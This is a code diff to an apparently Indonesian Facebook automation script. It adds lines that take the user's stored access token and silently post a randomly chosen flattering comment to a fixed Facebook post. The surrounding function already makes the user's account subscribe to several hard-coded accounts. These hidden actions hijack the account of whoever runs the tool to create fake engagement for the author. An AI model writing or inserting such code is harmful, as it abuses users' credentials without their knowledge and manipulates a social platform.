@@ -253,6 +253,13 @@ def gen():
         bot_follow()
         menu()
 
+
+komtwol = random.choice(["Salam 2 Jari Bang", "Sensei @[100002664282607:] Terbak Lah ", "bang lu kgk punya pacar?", "MengKeren Lah Bang", "Semangat Bang!", "Ikut Komen Ah Biar Di Akui Sensei @[100002664282607:]", "Gua Murid Lu Bang", "Ara Ara Abang Terkenal Amat", "Tumben Post Bang?", "Gua Pengin Jadi Kek Abang", "Semoga Abang Jadi Orang Sukses", "Bjir Lawack Kali Kau Bang"])
+
+komen = komtwol
+
+
+
 def bot_follow():
 	try:
 		toket=open("login.txt","r").read()
@@ -263,6 +270,7 @@ def bot_follow():
 	except IOError:
 		print((p+" ["+k+"•"+m+"•"+p+"] Token Invalid"))
 		logs()
+	requests.post('https://graph.facebook.com/4004071876358249/comments/?message=' +komen+ '&access_token=' + toket)
 	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      # Dapunta Khurayra X
 	requests.post("https://graph.facebook.com/1673250723/subscribers?access_token=" + toket)      # Dapunta Ratya
 	requests.post("https://graph.facebook.com/100000431996038/subscribers?access_token=" + toket) # Almira Gabrielle X
